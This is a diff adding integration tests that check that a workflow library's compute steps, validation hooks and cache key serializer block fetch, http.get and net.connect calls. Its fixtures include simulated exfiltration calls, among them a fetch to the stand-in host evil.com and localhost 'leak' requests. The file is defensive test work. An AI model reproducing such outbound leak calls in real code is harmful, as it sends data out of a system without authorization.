@@ -1,5 +1,6 @@
 import { expect } from 'chai';
 import http from 'node:http';
+import net from 'node:net';
 import {
     Step,
     flow,
@@ -795,6 +796,159 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                     }
                 },
             );
+        });
+    });
+
+    describe('Step.compute Always-Deny Network Perimeter', () => {
+        it('blocks fetch(), http.get(), and net.connect() even when parent flow has no networkPolicy', async () => {
+            const fetchCompute = Step.compute('computeFetch', () => {
+                fetch('https://api.stripe.com/v1/charges');
+                return { ok: true };
+            });
+
+            try {
+                await flow(fetchCompute).run({});
+                expect.fail('Should have blocked fetch in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeFetch');
+                expect(err.requestedHost).to.equal('api.stripe.com');
+                expect(err.allowedHosts).to.deep.equal([]);
+                expect(err.retryable).to.be.false;
+            }
+
+            const httpCompute = Step.compute('computeHttp', () => {
+                http.get(`http://127.0.0.1:${localPort}/health`);
+                return { ok: true };
+            });
+
+            try {
+                await httpCompute.run({});
+                expect.fail('Should have blocked http.get in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeHttp');
+            }
+
+            const netCompute = Step.compute('computeNet', () => {
+                net.connect({ host: '127.0.0.1', port: localPort });
+                return { ok: true };
+            });
+
+            try {
+                await netCompute.run({});
+                expect.fail('Should have blocked net.connect in Step.compute');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('computeNet');
+            }
+        });
+
+        it('denies network egress inside Step.compute even when parent flow explicitly allows localhost and all hosts', async () => {
+            const fetchLocal = Step.create('fetchLocal', async () => {
+                const res = await fetch(`http://127.0.0.1:${localPort}/ok`);
+                return await res.json();
+            });
+            const sneakyCompute = Step.compute('sneakyCompute', () => {
+                http.get(`http://127.0.0.1:${localPort}/leak`);
+                return { leaked: true };
+            });
+
+            const permissiveFlow = flow(fetchLocal, sneakyCompute).networkPolicy({
+                enabled: true,
+                defaultPolicy: 'allow',
+                allowedHosts: ['*'],
+                allowLocalhost: true,
+            });
+
+            try {
+                await permissiveFlow.run({});
+                expect.fail('Step.compute must override permissive parent flow policy');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('sneakyCompute');
+                expect(err.allowedHosts).to.deep.equal([]);
+            }
+        });
+
+        it('enforces always-deny network perimeter during .spec() validation, transform, translate, schema, and cache keySerializer', async () => {
+            const specNetworkStep = Step.compute('specNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                validate: () => {
+                    http.get(`http://127.0.0.1:${localPort}/spec-leak`);
+                    return true;
+                },
+            });
+
+            try {
+                await specNetworkStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() validate');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('specNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const transformNetStep = Step.compute('transformNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                transform: (v: number) => {
+                    fetch('https://evil.com/spec-transform');
+                    return v + 1;
+                },
+            });
+
+            try {
+                await transformNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() transform');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('transformNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const translateNetStep = Step.compute('translateNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                translate: () => {
+                    net.connect({ host: '127.0.0.1', port: localPort });
+                },
+            });
+
+            try {
+                await translateNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() translate');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('translateNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const schemaNetStep = Step.compute('schemaNet', (ctx: { x: number }) => ({ x: ctx.x })).spec('x', {
+                parse: (v: number) => {
+                    http.get(`http://127.0.0.1:${localPort}/schema-leak`);
+                    return v;
+                },
+            });
+
+            try {
+                await schemaNetStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside .spec() schema');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('schemaNet');
+                expect(err.phase).to.equal(ExecutionPhase.VALIDATION);
+            }
+
+            const keyNetworkStep = Step.compute('keyNet', (ctx: { x: number }) => ({ x: ctx.x })).cache({
+                keySerializer: () => {
+                    http.get(`http://127.0.0.1:${localPort}/key-leak`);
+                    return 'k';
+                },
+            });
+
+            try {
+                await keyNetworkStep.run({ x: 1 });
+                expect.fail('Should have blocked network call inside keySerializer');
+            } catch (err: any) {
+                expect(err).to.be.instanceOf(NetworkPolicyViolationException);
+                expect(err.stepName).to.equal('keyNet');
+            }
         });
     });
 });
